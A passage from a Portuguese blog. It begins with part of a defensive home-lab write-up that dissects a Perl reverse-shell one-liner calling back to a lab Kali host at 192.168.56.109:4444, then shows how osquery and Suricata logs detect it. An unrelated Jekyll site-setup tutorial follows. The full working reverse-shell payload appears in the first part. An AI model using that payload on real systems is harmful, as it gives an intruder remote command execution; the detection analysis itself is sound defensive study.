src="/assets/images/osquery-socketremotaddr-6b0fba5445b9c1e729404aca42372538.png" width="1902" height="582" class="img_ev3q"></p><p>Vamos ao estudo do que aconteceu. Quebrando o payload original em partes, e entendendo cada uma delas. O payload executado foi o seguinte:</p><div class="language-perl codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-perl codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">perl -MIO -e &#x27;$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,&quot;192.168.56.109:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);while(&lt;&gt;){if($_=~ /(.*)/){system $1;}};&#x27; &amp;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file=&quot;Payload malicioso&quot;}</p><ol><li>Esse payload cria um fork (processo filho);</li></ol><div class="language-perl codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-perl codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$p=fork;exit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol start="2"><li>Manipula as vari√°veis de ambiente;</li></ol><div class="language-perl codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-perl codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">if($p);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  foreach my $key(keys %ENV){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if($ENV{$key}=~/(.*)/){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $ENV{$key}=$1;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol start="3"><li>Cria uma vari√°vel <code>$c</code>, que cria um socket de rede com o Kali;</li></ol><div class="language-perl codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-perl codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$c=new IO::Socket::INET(PeerAddr,&quot;192.168.56.109:4444&quot;);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol start="4"><li>O fork le a entrada(<code>STDIN</code>) que digitar-mos, e escreve a sa√≠da (<code>$~</code>) no socket <code>$c</code> por meio de um redirecionamento, isso tudo em looping, fazendo parecer um shell interativo.</li></ol><div class="language-perl codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-perl codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">STDIN-&gt;fdopen($c,r);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$~-&gt;fdopen($c,w);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">while(&lt;&gt;){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if($_=~ /(.*)/){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  system $1;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><blockquote><p>Pelo o que entendi, esses if&#x27;s (<code>if($_=~ /(.*)/)</code>) s√£o como uma prote√ß√£o contra script kiddies, ou apenas para redu√ß√£o de poss√≠veis danos maiores. Eles removem a possibilidade de uso de caracteres maliciosos (caracteres de escape e controle), pois com eles, o estrago pode ser muito maior pelo jeito. Mas atacantes sofisticados podem remover essas prote√ß√µes.
{: .prompt-info}</p></blockquote><p>Essa parte achei bem interessante, da pra diferenciar o tipo de atacante s√≥ pelo payload!</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="detecting-kernel-exploit-download---splunk">Detecting Kernel Exploit Download - Splunk<a href="#detecting-kernel-exploit-download---splunk" class="hash-link" aria-label="Link direto para Detecting Kernel Exploit Download - Splunk" title="Link direto para Detecting Kernel Exploit Download - Splunk">‚Äã</a></h3><p>Agora que sabemos que o servidor foi ownado podemos ver se ele fez requisi√ß√µes para outros servidores.</p><div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> process_open_sockets </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> remote_address </span><span class="token operator" style="color:#393A34">=</span><span class="token plain">  </span><span class="token string" style="color:#e3116c">&#x27;192.168.56.109&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><img loading="lazy" alt="wget.png" src="/assets/images/wget-7d28e70d48569128f63fa91006bf6134.png" width="1170" height="596" class="img_ev3q"></p><p>Pelos logs do suricata, conseguimos pegar a requisi√ß√£o originada pelo servidor para o servidor malicioso, que foi usada para fazer o download do malware.  </p><p>Esse foi apenas um exemplo de v√°rias das possibilidades com esse laborat√≥rio.</p><h1>Referencias</h1><ul><li><a href="https://detectionlab.network" target="_blank" rel="noopener noreferrer">https://detectionlab.network</a></li><li><a href="https://docs.nxlog.co/userguide/configure/index.html" target="_blank" rel="noopener noreferrer">https://docs.nxlog.co/userguide/configure/index.html</a></li><li><a href="https://osquery.readthedocs.io/en/latest/" target="_blank" rel="noopener noreferrer">https://osquery.readthedocs.io/en/latest/</a></li><li><a href="https://github.com/rapid7/metasploitable3/" target="_blank" rel="noopener noreferrer">https://github.com/rapid7/metasploitable3/</a></li></ul><p><em>[SO]<!-- -->:&quot;Sistema Operacional&quot;
</em>[dropo]<!-- -->: &quot;Do ingles, drop, derrubar&quot;</p></div><footer class="row docusaurus-mt-lg"><div class="col"><b>Marcadores:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/blog/tags/pratica">pr√°tica</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/blog/tags/tutorial">tutorial</a></li></ul></div></footer></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="http://schema.org/BlogPosting"><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/blog/2023/02/22/intro-jekyll/introducao-jekyll">Seu site pessoal gratis</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2023-02-22T18:40:00.000Z" itemprop="datePublished">22 de fevereiro de 2023</time> ¬∑ <!-- -->Leitura de 7 minutos</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_Hf19"><div class="avatar margin-bottom--sm"><a href="https://www.linkedin.com/in/gguedescruz/" target="_blank" rel="noopener noreferrer" class="avatar__photo-link"><img class="avatar__photo" src="https://avatars.githubusercontent.com/u/52048434?v=4" alt="Godes"></a><div class="avatar__intro" itemprop="author" itemscope="" itemtype="https://schema.org/Person"><div class="avatar__name"><a href="https://www.linkedin.com/in/gguedescruz/" target="_blank" rel="noopener noreferrer" itemprop="url"><span itemprop="name">Godes</span></a></div><small class="avatar__subtitle" itemprop="description">Defesa Cibern√©tica</small></div></div></div></div></header><div class="markdown" itemprop="articleBody"><p>Aqui, vou explicar como fazer a instala√ß√£o do seu futuro site pessoal. </p><h1>Requisitos</h1><p>O Sistema Operacional, n√£o √© um requisito, √© mais um aviso:</p><blockquote><p>Tudo foi feito em um Linux baseado em Ubuntu, o mesmo pode ser reproduzido em qualquer distribui√ß√£o Linux, e tamb√©m em m√°quina virtual.
{: .prompt-warning}</p></blockquote><p>Minha distro √© a seguinte:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">DISTRIB_ID=Pop</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DISTRIB_RELEASE=22.04</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DISTRIB_CODENAME=jammy</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DISTRIB_DESCRIPTION=&quot;Pop!_OS 22.04 LTS&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Qualquer outra distribui√ß√£o pode ser usada sem problemas, desde que tenha comandos equivalentes, com o mesmo efeito.</p><p>Tamb√©m recomendo que tenha conhecimento b√°sico em git e github, ou no m√≠nimo, saiba fazer um fork pela interface web do github e conhe√ßa os comandos abaixo:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">git clone</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">git status</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">git commit </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">git add</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">git pull</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">git push</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Caso n√£o conhe√ßa:</p><ul><li><a href="https://www.youtube.com/watch?v=DqTITcMq68k" target="_blank" rel="noopener noreferrer">V√≠deo r√°pido da Rafaella Ballerini</a></li><li><a href="https://www.youtube.com/playlist?list=PLHz_AreHm4dm7ZULPAmadvNhH6vk9oNZA" target="_blank" rel="noopener noreferrer">Playlist detalhada do Curso em V√≠deo</a></li></ul><h1>Instala√ß√£o TLTR - Too lazy to read</h1><p>Se n√£o estiver afim de ler toda a teoria pode pular para <a href="#instala%C3%A7%C3%A3o">Instala√ß√£o</a>, ou execute os comandos abaixo:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo apt-get install ruby-full build-essential zlib1g-dev</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;# Install Ruby Gems to ~/gems&#x27; &gt;&gt; ~/.bashrc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;export GEM_HOME=&quot;$HOME/gems&quot;&#x27; &gt;&gt; ~/.bashrc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;export PATH=&quot;$HOME/gems/bin:$PATH&quot;&#x27; &gt;&gt; ~/.bashrc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">source ~/.bashrc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gh repo clone SEU-USERNAME/SEU-USERNAME.github.io</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">git clone https://github.com/SEU-USERNAME/SEU-USERNAME.github.io.git</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bundle install</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h1>Abordagem</h1><p>Primeiro apresento o conceito, para que mesmo que n√£o deseje seguir usando o mesmo tema que eu, ainda assim, consiga seguir seu pr√≥prio caminho, customizando a sua maneira.</p><p>Eu poderia seguir s√≥ mostrando como instalar as parada sem explicar nada, que √© o que os tutoriais gringos fazem. Mas o fato √© que as documenta√ß√µes e v√≠deos de te√≥ricos j√° est√£o todos na l√≠ngua deles, ent√£o vou tentar desenvolver tamb√©m alguns pontos da teoria que acho importante conhecer. Tem coisa que eu s√≥ traduzi da documenta√ß√£o oficial. </p><p>N√£o √© preciso decorar nem aprender tudo s√≥ leia os conceitos com calma e tudo vai fazer sentido no final.</p><p><em>Certamente n√£o sou a melhor pessoa para falar sobre frontend web, mas como n√£o achei esse conte√∫do em portugu√™s, vale a pena tentar!</em> </p><h1>Introdu√ß√£o ao Jekyll</h1><p>Jekyll √© um framework (tecnicamente falando, √© uma engine de parsing) usado para transformar arquivos de texto em p√°ginas est√°ticas para o seu website pessoal! </p><p>Ou seja, h√° por meio dele podemos escrever e compartilhar, por meio do seu pr√≥prio site, sem precisar se aprofundar em HTML e CSS. Mas antes de chegar nessa parte vamos entender os componentes do Jekyll.</p><blockquote><p>Tem uma <a href="https://youtube.com/playlist?list=PLLAZ4kZ9dFpOPV5C5Ay0pHaa0RJFhcmcB" target="_blank" rel="noopener noreferrer">playlist no youtube</a> com v√≠deos curtos sobre o Jekyll, mas est√° em ingl√™s.
{: .prompt-info }</p></blockquote><p>Na ess√™ncia, ele usa 3 arquivos:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‚îú‚îÄ‚îÄ _config.yml</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‚îú‚îÄ‚îÄ _layouts</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‚îÇ   ‚îî‚îÄ‚îÄ default.html</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‚îî‚îÄ‚îÄ index.md</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Imagine-os com o seguinte conte√∫do:</p><ul><li>O <code>config.yml</code> √© o arquivo com as principais configura√ß√µes que o Jekyll usa para criar o site. Um arquivo vazio, usa as configura√ß√µes padr√µes.<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">name: My Jekyll Website</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></li><li>O arquivo <code>index.md</code> √© de conte√∫do. O Jekyll procura por aquivos com as tags <code>---</code> (chamadas tags front-matter) para processar o conte√∫do, preencher as vari√°veis, e converter o conte√∫do em HTML. Veja o exemplo de como poderia ser o <code>index.md</code>:<div class="language-markdown codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-markdown codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token front-matter-block punctuation" style="color:#393A34">---</span><span class="token front-matter-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token front-matter-block"></span><span class="token front-matter-block front-matter yaml language-yaml key atrule" style="color:#00a4db">title</span><span class="token front-matter-block front-matter yaml language-yaml punctuation" style="color:#393A34">:</span><span class="token front-matter-block front-matter yaml language-yaml"> Titulo</span><br></span><span class="token-line" style="color:#393A34"><span class="token front-matter-block front-matter yaml language-yaml"></span><span class="token front-matter-block front-matter yaml language-yaml key atrule" style="color:#00a4db">layout</span><span class="token front-matter-block front-matter yaml language-yaml punctuation" style="color:#393A34">:</span><span class="token front-matter-block front-matter yaml language-yaml"> default</span><span class="token front-matter-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token front-matter-block"></span><span class="token front-matter-block punctuation" style="color:#393A34">---</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">conte√∫do lalalalala</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">1.</span><span class="token plain"> Lista</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">2.</span><span class="token plain"> Numerada</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> Lista </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> Normal</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></li></ul><ul><li>Tudo que vem ap√≥s os 3 √∫ltimos tra√ßos <code>---</code> ser√° considerado conte√∫do da postagem. Esse conte√∫do ser√° formatado pelo seguinte arquivo <code>default.html</code>.</li></ul><p><img loading="lazy" alt="htmlsample" src="data:image/png;base64,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